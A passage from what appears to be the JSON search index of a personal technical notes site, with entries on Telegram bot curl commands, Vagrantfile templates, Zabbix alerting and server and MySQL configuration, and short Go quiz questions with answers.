style=\"color:#e6db74\"\u003e\u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# thread\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;https://api.telegram.org/bot1234567890:KE9zNTZ8RGcxJTMlI29EJElKeU9QQExm3%E/sendMessage?chat_id=-12345\u0026amp;text=hello\u0026amp;message_thread_id=14\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Telegram Command"},{"categories":null,"contents":" Vagrantfile template docker Nginx hyperv CentOS7 Win2019 virtualbox Vagrantfile vmware Vagrantfile multi Vagrantfile others common Vagrantfile Metasploitable3 Vagrantfile ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/vagrant/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eVagrantfile template\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"docker\"\u003edocker\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/docker/Vagrantfile\"\u003eNginx\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"hyperv\"\u003ehyperv\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/hyperv/Vagrantfile.CentOS7\"\u003eCentOS7\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/hyperv/Vagrantfile.Win2019\"\u003eWin2019\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"virtualbox\"\u003evirtualbox\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/virtualbox/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"vmware\"\u003evmware\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/vmware_fusion/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"multi\"\u003emulti\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/multi/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eothers\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch5 id=\"common\"\u003ecommon\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/common/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch5 id=\"metasploitable3\"\u003eMetasploitable3\u003c/h5\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/notes/docs/vagrant/files/metasploitable3/Vagrantfile\"\u003eVagrantfile\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Vagrant docs"},{"categories":null,"contents":" send alert Use Webhook, Create Channel and Webhook in Mattermost, and put script to $(grep AlertScriptsPath /etc/zabbix/zabbix_server.conf). Create Media types in Zabbix(Administration -\u0026gt; Medai types). Add media to user(Administration -\u0026gt; Users -\u0026gt; Media). Create action(Configuration -\u0026gt; Actions -\u0026gt; Trigger actions)。 Debug(Write log in script). Media types: PROBLEM:\\nProblem started at {EVENT.TIME} on {EVENT.DATE}\\n 問題: {EVENT.NAME}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 目前數值: {EVENT.OPDATA}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL} RECOVERY:\\nProblem has been resolved at {EVENT.RECOVERY.TIME} on {EVENT.RECOVERY.DATE}\\n 問題: {EVENT.NAME}\\n 持續時間: {EVENT.DURATION}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL} zabbix server /etc/zabbix/zabbix_server.conf Zabbix Server perform high loading, and slow query. Increase ValueCacheSize solve this problem.\nLogFile=/var/log/zabbix/zabbix_server.log LogFileSize=5 PidFile=/var/run/zabbix/zabbix_server.pid SocketDir=/var/run/zabbix DBHost=localhost DBName=zabbix_db DBUser=zabbix_user DBPassword=zabbix DBSocket=/data/mysql/mysql.sock StartPollers=200 StartPreprocessors=30 StartPollersUnreachable=30 StartTrappers=100 StartDiscoverers=30 SNMPTrapperFile=/var/log/snmptrap/snmptrap.log CacheSize=4G HistoryCacheSize=2G HistoryIndexCacheSize=2G TrendCacheSize=2G ValueCacheSize=24G Timeout=30 UnavailableDelay=120 AlertScriptsPath=/usr/lib/zabbix/alertscripts ExternalScripts=/usr/lib/zabbix/externalscripts LogSlowQueries=3000 StatsAllowedIP=127.0.0.1 /etc/my.cnf [client-server] socket=/data/mysql/mysql.sock [mysqld] socket=/data/mysql/mysql.sock datadir=/data/mysql character_set_server=utf8mb4 character_set_filesystem=utf8 max_allowed_packet=32M event_scheduler=1 default_storage_engine=innodb open_files_limit=65535 local_infile=1 sysdate_is_now=1 back_log=256 ##error log format # connection interactive_timeout=28800 wait_timeout=28800 lock_wait_timeout=28800 skip_name_resolve=1 max_connections=2000 max_user_connections=1000 max_connect_errors=1000000 # table cache performance settings # table_open_cache=8192 table_definition_cache=8192 table_open_cache_instances=16 # session memory settings # read_buffer_size=131072 read_rnd_buffer_size=262144 sort_buffer_size=262144 tmp_table_size=67108864 join_buffer_size=8M thread_cache_size=256 # log settings # ###slow log ### slow_query_log=1 log_queries_not_using_indexes=0 log_slow_admin_statements=1 #log_slow_slave_statements = 1 log_throttle_queries_not_using_indexes=1 long_query_time=0.5 log_bin_trust_function_creators=1 ###binlog ### binlog_cache_size=32K max_binlog_cache_size=1G max_binlog_size=2G expire_logs_days=31 log_slave_updates=1 #binlog_format=STATEMENT binlog_format=ROW slave_compressed_protocol = 1 # innodb settings # #innodb_data_file_path=ibdata1:4G;ibdata2:4G:autoextend innodb_page_size=16384 innodb_buffer_pool_size=4G innodb_buffer_pool_instances=1 innodb_buffer_pool_load_at_startup=1 innodb_buffer_pool_dump_at_shutdown=1 innodb_lock_wait_timeout=50 innodb_io_capacity=100 innodb_io_capacity_max=200 innodb_flush_neighbors=1 innodb_file_per_table=1 innodb_log_files_in_group=3 innodb_log_file_size=2G innodb_log_buffer_size=33554432 innodb_purge_threads=2 innodb_large_prefix=1 innodb_thread_concurrency=64 innodb_print_all_deadlocks=1 innodb_strict_mode=1 innodb_sort_buffer_size=67108864 innodb_write_io_threads=4 innodb_read_io_threads=4 innodb_online_alter_log_max_size=1G innodb_open_files=60000 innodb_max_dirty_pages_pct=75 innodb_adaptive_flushing=on innodb_flush_log_at_trx_commit=1 sync_binlog =1 [mysqld_safe] log-error=/var/log/mariadb/mariadb.log # # include *.cnf from the config directory # !includedir /etc/my.cnf.d ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/docs/zabbix/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esend alert\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003col\u003e\n\u003cli\u003eUse Webhook, Create Channel and Webhook in Mattermost, and put script to $(grep AlertScriptsPath /etc/zabbix/zabbix_server.conf).\u003c/li\u003e\n\u003cli\u003eCreate Media types in Zabbix(Administration -\u0026gt; Medai types).\u003c/li\u003e\n\u003cli\u003eAdd media to user(Administration -\u0026gt; Users -\u0026gt; Media).\u003c/li\u003e\n\u003cli\u003eCreate action(Configuration -\u0026gt; Actions -\u0026gt; Trigger actions)。\u003c/li\u003e\n\u003cli\u003eDebug(Write log in script).\n\u003col\u003e\n\u003cli\u003eMedia types:\n\u003col\u003e\n\u003cli\u003ePROBLEM:\\nProblem started at {EVENT.TIME} on {EVENT.DATE}\\n 問題: {EVENT.NAME}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 目前數值: {EVENT.OPDATA}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL}\u003c/li\u003e\n\u003cli\u003eRECOVERY:\\nProblem has been resolved at {EVENT.RECOVERY.TIME} on {EVENT.RECOVERY.DATE}\\n 問題: {EVENT.NAME}\\n 持續時間: {EVENT.DURATION}\\n 主機: {HOST.NAME}\\nSeverity: {EVENT.SEVERITY}\\n 問題 ID: {EVENT.ID}\\n{TRIGGER.URL}\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/li\u003e\n\u003c/ol\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ezabbix server\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"etczabbixzabbix_serverconf\"\u003e/etc/zabbix/zabbix_server.conf\u003c/h6\u003e\n\u003cp\u003eZabbix Server perform high loading, and slow query. Increase ValueCacheSize solve this problem.\u003c/p\u003e","tags":null,"title":"Zabbix docs"},{"categories":null,"contents":" array package main import ( \u0026#34;fmt\u0026#34; ) func main() { a := [5]int{1, 2, 3, 4, 5} t := a[3:4:4] fmt.Println(t[0]) } A. 3 B. 4 C. compilation error Answer Try it B ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/array/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003earray\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e [\u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e]\u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e{\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e5\u003c/span\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e3\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e:\u003cspan style=\"color:#ae81ff\"\u003e4\u003c/span\u003e]\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003et\u003c/span\u003e[\u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e])\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eA. 3\u003c/li\u003e\n\u003cli\u003eB. 4\u003c/li\u003e\n\u003cli\u003eC. compilation error\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/z3KqBXFXMm3\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode\u003eB\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Array"},{"categories":null,"contents":" channel package main import ( \u0026#34;fmt\u0026#34; \u0026#34;time\u0026#34; ) func main() { ch := make(chan int, 1000) go func() { for i := 0; i \u0026lt; 10; i++ { ch \u0026lt;- i } }() go func() { for { a, ok := \u0026lt;-ch if !ok { fmt.Println(\u0026#34;close\u0026#34;) return } fmt.Println(\u0026#34;a: \u0026#34;, a) } }() close(ch) fmt.Println(\u0026#34;ok\u0026#34;) time.Sleep(time.Second * 100) } Answer Try it ok panic: send on closed channel channel1 package main import ( \u0026#34;fmt\u0026#34; ) func main() { c := make(chan int) close(c) val, _ := \u0026lt;-c fmt.Println(val) } Answer Try it 0 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/channel/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003echannel\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;time\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e, \u003cspan style=\"color:#ae81ff\"\u003e1000\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e \u0026lt; \u003cspan style=\"color:#ae81ff\"\u003e10\u003c/span\u003e; \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e++\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ei\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#66d9ef\"\u003ego\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e !\u003cspan style=\"color:#a6e22e\"\u003eok\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;close\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\t\u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;a: \u0026#34;\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ea\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\t}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t}()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tclose(\u003cspan style=\"color:#a6e22e\"\u003ech\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ok\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSleep\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003etime\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eSecond\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/OtDbNbLE1cH\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003eok\npanic: send on closed channel\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003echannel1\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e() {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e make(\u003cspan style=\"color:#66d9ef\"\u003echan\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003eint\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\tclose(\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003eval\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003e_\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e\u0026lt;-\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ec\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\t\u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003ePrintln\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eval\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdetails\u003e\n\u003csummary\u003eAnswer\u003c/summary\u003e\n\u003cpre\u003e\u003ca href=\"https://go.dev/play/p/S9Juy0nlAvz\" target=\"_blank\"\u003eTry it\u003c/a\u003e\n\u003ccode class=\"language-shell\"\u003e0\n\u003c/code\u003e\u003c/pre\u003e\u003c/details\u003e\n\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Channel"},{"categories":null,"contents":" context package main import ( \u0026#34;context\u0026#34; \u0026#34;fmt\u0026#34; ) func f(ctx context.Context) { context.WithValue(ctx, \u0026#34;foo\u0026#34;, -6) } func main() { ctx := context.TODO() f(ctx) fmt.Println(ctx.Value(\u0026#34;foo\u0026#34;)) } A. -6 B. 0 C. \u0026lt;nil\u0026gt; D: panic Answer Try it C context1 package main import( \u0026#34;fmt\u0026#34; \u0026#34;encoding/json\u0026#34; \u0026#34;context\u0026#34; ) func main() { data, _ := json.Marshal(context.WithValue(context.Background(), \u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;)) fmt.Println(string(data)) } Answer Try it {\"Context\":{}} ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/go/questions/context/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003econtext\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003emain\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e 